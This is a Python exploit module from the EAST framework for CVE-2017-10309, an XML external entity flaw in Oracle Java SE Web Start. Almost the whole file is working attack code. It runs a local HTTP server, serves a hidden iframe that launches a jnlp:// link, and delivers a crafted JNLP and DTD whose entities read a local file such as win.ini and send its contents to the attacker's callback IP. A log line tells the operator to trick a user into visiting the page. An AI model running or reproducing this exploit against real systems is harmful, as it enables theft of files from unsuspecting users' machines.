#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import time
import urllib
import thread

sys.path.append('./core')
from Sploit import Sploit
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer

INFO = {}
INFO['NAME'] = "efa_oracle_java_se_xxe"
INFO['DESCRIPTION'] = "Oracle Java SE - Web Start jnlp XML External Entity Processing Information Disclosure"
INFO['VENDOR'] = "https://java.com"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/43103/']
INFO["CVE Name"] = "CVE-2017-10309"
INFO["NOTES"] = """Java SE installs a protocol handler in the registry as "HKEY_CLASSES_ROOT\jnlp\Shell\Open\Command\Default" 'C:\Program Files\Java\jre1.8.0_131\bin\jp2launcher.exe" -securejws "%1"'. 
This can allow allow an attacker to launch remote jnlp files with little user interaction. A malicious jnlp file containing a crafted XML XXE attack to be leveraged to disclose files, cause a denial of service or trigger SSRF.
"""

INFO['CHANGELOG'] = "01 Nov, 2017. Written by Gleg team."
INFO['PATH'] = 'Exploits/General/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["CALLBACK_IP"] = "127.0.0.1", dict(description = 'Server IP')
OPTIONS["PATH"] = "C:/windows/win.ini", dict(description = 'File path')

XML = '''<!ENTITY % data SYSTEM "file:///{}"> 
<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://{}:9090/leaked?%data;'>">'''
HTML = '<html><body><iframe src="jnlp://{}:9090/EaST.jnlp" style="width:0;height:0;border:0; border:none;"></iframe></body></html>'
JNLP = '''<?xml version="1.0" ?> 
<!DOCTYPE r [ 
<!ELEMENT r ANY > 
<!ENTITY % sp SYSTEM "http://{}:9090/EaST.xml"> 
%sp; 
%param1; 
%exfil; 
]>
'''

LOG = None

class MyHandler(BaseHTTPRequestHandler):
        
    def do_GET(self):
        
        if 'leaked' in self.path:
            LOG('= File Content =')
            LOG(self.path.split("?")[1])
            LOG('= End of File  =')
            self.send_response(200)
            self.end_headers()
            
        elif self.path == '/':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Content-length', len(HTML))
            self.end_headers()
            self.wfile.write(HTML)
            
        elif 'EaST.xml' in self.path:
            self.send_response(200)
            self.send_header('Content-Type', 'text/xml')
            self.send_header('Content-length', len(XML))
            self.end_headers()
            self.wfile.write(XML)
            
        elif 'EaST.jnlp' in self.path:
            self.send_response(200)
            self.send_header('Content-Type', 'application/x-java-jnlp-file')
            self.send_header('Content-length', len(JNLP))
            self.end_headers()
            self.wfile.write(JNLP)
        return
            
    def log_message(self, format, *args):
        LOG(urllib.unquote(args[0]))

class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        self.callback_ip = ''
        self.path = ''
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.callback_ip = self.args.get('CALLBACK_IP', OPTIONS["CALLBACK_IP"])
        self.path = self.args.get('PATH', OPTIONS["PATH"])
    
    def run(self):
        self.args()
        
        global LOG
        LOG = self.log
        global XML
        XML = XML.format(self.path, self.callback_ip)
        global HTML
        HTML = HTML.format(self.callback_ip)
        global JNLP
        JNLP = JNLP.format(self.callback_ip)
        
        self.log('Starting server')
        serv = HTTPServer(('', 9090), MyHandler)
        thread.start_new_thread(serv.serve_forever, ())
        
        self.log('Server started. Trick user visit http://{}:9090/'.format(self.callback_ip))
        self.log('Wait 120 seconds')
        
        time.sleep(120)
        self.finish(True)
        
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
